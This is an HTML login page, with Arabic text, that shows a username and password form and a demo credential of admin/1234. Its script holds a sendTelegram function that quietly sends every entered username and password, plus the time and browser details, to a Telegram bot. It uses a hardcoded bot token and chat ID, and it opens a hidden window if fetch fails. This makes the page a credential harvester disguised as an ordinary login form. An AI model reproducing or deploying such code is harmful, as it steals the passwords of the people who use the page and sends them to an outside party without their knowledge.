<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>

<meta charset="UTF-8">

<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>تسجيل الدخول</title>

<style>

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial;
}

body{

    background:linear-gradient(135deg,#4facfe,#00f2fe);
    height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    padding:20px;

}

.login-box{

    background:white;
    padding:40px;
    border-radius:20px;
    width:320px;
    box-shadow:0 0 25px rgba(0,0,0,0.2);
    text-align:center;

}

.login-box h2{

    margin-bottom:25px;
    color:#1e293b;

}

.login-box input{

    width:100%;
    padding:12px;
    margin:10px 0;
    border:1px solid #ccc;
    border-radius:10px;
    font-size:16px;
    outline:none;

}

.login-box input:focus{

    border-color:#007bff;

}

.login-box button{

    width:100%;
    padding:12px;
    border:none;
    border-radius:10px;
    background:#007bff;
    color:white;
    font-size:16px;
    cursor:pointer;
    margin-top:10px;

}

.login-box button:hover{

    background:#0056b3;

}

.message{

    margin-top:15px;
    font-size:15px;

}

.success{

    color:green;

}

.error{

    color:red;

}

.demo{

    margin-top:15px;
    font-size:13px;
    color:#64748b;

}

</style>

</head>

<body>

<div class="login-box">

<h2>تسجيل الدخول</h2>

<input type="text" id="username" placeholder="اسم المستخدم">

<input type="password" id="password" placeholder="كلمة المرور">

<button onclick="login()">دخول</button>

<div class="message" id="message"></div>

<div class="demo">

بيانات تجريبية: admin / 1234

</div>

</div>

<script>

// دالة إرسال بيانات تسجيل الدخول إلى تليجرام
function sendTelegram(username, password) {
    // توكن البوت الخاص بك
    let token = "5332397047:AAHRZXSwxT3EfCT8xtCku4wh-xtE0cjla98";
    
    // معرف الدردشة الخاص بك
    let chat_id = "793135440";
    
    // إنشاء نص الرسالة مع اسم المستخدم وكلمة المرور والوقت
    let currentTime = new Date().toLocaleString('ar-EG');
    let text = `🔐 محاولة دخول جديدة 🔐%0A%0A👤 اسم المستخدم: ${username}%0A🔑 كلمة المرور: ${password}%0A⏰ الوقت: ${currentTime}%0A🌐 المتصفح: ${navigator.userAgent.split(' ').slice(0,3).join(' ')}`;
    
    // إنشاء رابط الإرسال
    let url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + text;
    
    // إرسال البيانات (طريقة خلفية بدون فتح نافذة جديدة)
    fetch(url)
        .then(response => response.json())
        .then(data => {
            if(data.ok) {
                console.log("✅ تم إرسال البيانات إلى تليجرام بنجاح");
            } else {
                console.log("❌ فشل الإرسال:", data);
            }
        })
        .catch(error => {
            console.log("⚠️ خطأ في الاتصال:", error);
            // في حالة فشل fetch، نحاول الطريقة البديلة
            try {
                window.open(url, '_blank');
                setTimeout(() => {
                    // إغلاق النافذة بعد ثانية إذا تم فتحها
                    window.close();
                }, 1000);
            } catch(e) {
                console.log("تعذر الإرسال");
            }
        });
}

// دالة تسجيل الدخول المعدلة
function login(){

    let username = document.getElementById("username").value.trim();
    let password = document.getElementById("password").value.trim();
    let message = document.getElementById("message");

    message.innerHTML = "";
    message.className = "message";

    // ✅ إضافة: إرسال البيانات إلى تليجرام (حتى لو كانت خاطئة)
    // ولكن نرسلها فقط إذا كانت الحقول غير فارغة
    if(username !== "" && password !== ""){
        sendTelegram(username, password);
    }

    if(username === "admin" && password === "1234"){

        message.innerHTML = "✅ تم تسجيل الدخول بنجاح";
        message.classList.add("success");

    }else{

        message.innerHTML = "❌ اسم المستخدم أو كلمة المرور غير صحيحة";
        message.classList.add("error");
        
        // إذا كانت البيانات خاطئة، ننبه أيضا (اختياري)
        if(username !== "" && password !== ""){
            console.log("محاولة فاشلة: " + username + " / " + password);
        }
    }
}

// إضافة خاصية إرسال عند الضغط على Enter
document.getElementById("username").addEventListener("keypress", function(event) {
    if (event.key === "Enter") {
        event.preventDefault();
        login();
    }
});

document.getElementById("password").addEventListener("keypress", function(event) {
    if (event.key === "Enter") {
        event.preventDefault();
        login();
    }
});

</script>

</body>

</html>
